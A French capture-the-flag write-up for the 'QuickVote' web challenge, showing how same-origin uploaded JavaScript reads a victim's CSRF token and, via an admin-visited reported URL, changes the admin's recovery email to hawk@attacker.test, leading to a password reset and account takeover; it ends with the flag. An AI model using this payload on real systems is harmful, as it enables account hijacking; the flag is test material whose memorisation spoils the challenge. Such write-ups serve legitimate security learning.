# isid0r3--quickvote-ctf-challenge (web, 99) — RÉSOLU

## Challenge
« Changer son adresse email sur QuickVote, c'est en deux clics. Le faire pour quelqu'un
d'autre sans lui demander, c'est le vrai challenge. » Accès **VPN** (10.100.45.101).
App Flask : sondages + widget "Embed" iframe cross-site. Cookie `session` **SameSite=None**.

## Surface
- `/register` (captcha math trivial « Combien font a+b ? »), `/login`, `/forgot-password` (par `username`).
- `/settings/recovery-email` (change email, **csrf_token** par formulaire) ; recovery_email sert au
  **reset mot de passe** ET d'adresse de réception de `/mailbox`.
- `/upload` : héberge du HTML **same-origin**, servi brut (`text/html`) à `/u/<id>` — **public**.
- `/report` : signale une URL → un **bot modérateur (admin authentifié)** la visite.

## Exploit — CSRF same-origin via le bot
Le csrf_token bloque la CSRF naïve, mais `/upload` donne du JS **same-origin** → on lit le token
de la victime et on poste à sa place.

1. S'inscrire, mettre son propre recovery_email = `hawk@attacker.test`.
2. Uploader une page dont le JS :
   ```js
   fetch('/settings').then(r=>r.text()).then(t=>{
     var m=t.match(/name="csrf_token" value="([^"]+)"/);
     fetch('/settings/recovery-email',{method:'POST',
       headers:{'Content-Type':'application/x-www-form-urlencoded'},
       body:'csrf_token='+m[1]+'&new_email=hawk@attacker.test'});
   });
   ```
3. `/report` l'URL `/u/<id>` → le bot admin la visite → **l'email de récupération de l'admin
   devient `hawk@attacker.test`**.
4. `/forgot-password` `username=admin` → lien de reset livré dans **ma** boîte mail (même recovery_email).
5. `/reset-password/<token>` (champ `new_password`, pas de csrf) → login `admin` → flag sur `/dashboard`.

## Flag
`NCTF{7417ad06526c5fdc17f53270}`
